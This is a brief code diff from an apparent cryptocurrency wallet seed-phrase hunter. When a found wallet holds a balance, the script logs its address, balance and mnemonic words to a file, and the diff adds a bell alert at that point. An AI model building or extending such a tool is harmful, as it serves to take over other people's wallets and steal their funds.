@@ -57,6 +57,7 @@ def check():
         if balance > 0:
             with open('ThanksTrails.txt', 'a') as w:
                 w.write(f'{addy} - {balance} - {mnemonic_words}\n')
+            print(f'\a')
             os._exit(os.EX_OK)
 
 
